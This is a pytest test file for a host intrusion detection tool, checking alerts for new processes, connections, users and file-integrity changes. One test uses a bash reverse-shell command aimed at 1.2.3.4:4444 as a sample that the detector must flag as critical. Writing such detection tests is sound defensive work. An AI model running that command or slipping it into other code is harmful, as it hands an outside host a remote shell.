from hostids.engine import (
    check_new_processes, check_new_connections, check_users,
    check_file_integrity, take_snapshot, diff,
)
from hostids.collectors import (
    Process, Connection, list_processes, list_connections,
)


def test_new_process_detection():
    old = {1: Process(1, "init", "init", 0, "root")}
    new = dict(old)
    new[999] = Process(999, "bash", "bash", 1000, "diogo")
    alerts = check_new_processes(old, new)
    assert len(alerts) == 1
    assert "999" in alerts[0].message


def test_suspicious_process_is_critical():
    old = {}
    new = {123: Process(123, "bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", 1000, "x")}
    alerts = check_new_processes(old, new)
    assert alerts[0].severity == "critical"
    assert "reverse shell" in alerts[0].message


def test_new_connection_detection():
    old = []
    new = [Connection("tcp", "192.168.0.5:1234", "93.184.216.34:443", "ESTABLISHED", "0")]
    alerts = check_new_connections(old, new)
    assert len(alerts) == 1
    assert alerts[0].severity == "warning"


def test_new_user_alert():
    alerts = check_users(["diogo"], ["diogo", "attacker"])
    assert len(alerts) == 1
    assert "attacker" in alerts[0].message


def test_file_integrity_modified():
    old = {"/etc/passwd": "aaa"}
    new = {"/etc/passwd": "bbb"}
    alerts = check_file_integrity(old, new)
    assert alerts[0].severity == "critical"
    assert "MODIFICADO" in alerts[0].message


def test_file_integrity_new_and_removed():
    alerts = check_file_integrity({"/a": "1"}, {"/b": "2"})
    cats = {a.message.split(":")[0] for a in alerts}
    assert any("REMOVIDO" in a.message for a in alerts)
    assert any("NOVO" in a.message for a in alerts)


def test_real_collectors_run():
    # Sanidade: coletores rodam no host sem erro e retornam dados plausíveis.
    procs = list_processes()
    assert len(procs) > 0
    conns = list_connections()
    assert isinstance(conns, list)


def test_snapshot_and_diff(tmp_path):
    f = tmp_path / "watched.txt"
    f.write_text("original")
    s1 = take_snapshot([str(f)])
    f.write_text("tampered")
    s2 = take_snapshot([str(f)])
    alerts = diff(s1, s2)
    assert any("MODIFICADO" in a.message for a in alerts)
